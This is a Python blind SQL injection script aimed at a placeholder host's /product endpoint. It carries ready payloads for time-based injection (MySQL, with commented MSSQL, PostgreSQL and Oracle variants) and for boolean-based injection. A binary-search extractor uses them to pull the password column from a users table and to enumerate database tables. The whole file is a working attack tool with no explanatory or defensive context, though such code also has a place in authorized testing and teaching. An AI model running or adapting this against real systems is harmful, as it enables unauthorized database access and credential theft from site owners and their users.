#!/usr/bin/env python3
import time
import requests

requests.packages.urllib3.disable_warnings()

BASE_URL = "https://target.local"
SESSION = requests.Session()

DELAY = 5  


def is_true_time_based(condition_sql: str, delay: int = DELAY) -> bool:
    payload = f"1' AND IF(({condition_sql}),SLEEP({delay}),0)-- -"

    # --- MSSQL ---
    # payload = f"1'; IF(({condition_sql})) WAITFOR DELAY '0:0:{delay}'-- -"

    # --- PostgreSQL ---
    # payload = f"1'; SELECT CASE WHEN ({condition_sql}) THEN pg_sleep({delay}) ELSE pg_sleep(0) END-- -"

    # --- Oracle  ---
    # payload = f"1' AND (SELECT CASE WHEN ({condition_sql}) THEN dbms_lock.sleep({delay}) ELSE NULL END FROM dual) IS NULL-- -"

    params = {"id": payload}
    start = time.time()
    SESSION.get(f"{BASE_URL}/product", params=params, verify=False, timeout=delay + 10)
    elapsed = time.time() - start
    return elapsed >= delay




def is_true_boolean_based(condition_sql: str) -> bool:
    payload = f"1' AND ({condition_sql})-- -"
    params = {"id": payload}
    r = SESSION.get(f"{BASE_URL}/product", params=params, verify=False, timeout=10)
    return "Welcome back" in r.text


def dump_value(select_query: str, oracle, max_len: int = 64) -> str:
   
    result = ""
    for pos in range(1, max_len + 1):
        low, high = 32, 126  
        while low <= high:
            mid = (low + high) // 2
            cond = f"ASCII(SUBSTRING(({select_query}),{pos},1))>{mid}"
            if oracle(cond):
                low = mid + 1
            else:
                high = mid - 1
        cond_eq = f"ASCII(SUBSTRING(({select_query}),{pos},1))={low}"
        if not oracle(cond_eq):
            break 
        result += chr(low)
        print(f"[+] {result}")
    return result


def extract_password_time_based(user_id: int = 1) -> str:
    return dump_value(f"SELECT password FROM users WHERE id={user_id}", is_true_time_based)


def extract_password_boolean_based(user_id: int = 1) -> str:
    return dump_value(f"SELECT password FROM users WHERE id={user_id}", is_true_boolean_based)


def enumerate_tables(oracle, db_name: str = "database()") -> list[str]:
    tables = []
    for i in range(20): 
        table = dump_value(
            f"SELECT table_name FROM information_schema.tables "
            f"WHERE table_schema={db_name} LIMIT 1 OFFSET {i}",
            oracle,
        )
        if not table:
            break
        tables.append(table)
        print(f"[*] Table: {table}")
    return tables


if __name__ == "__main__":
    # pwd = extract_password_time_based(user_id=1)
    # print(f"Password: {pwd}")
    pass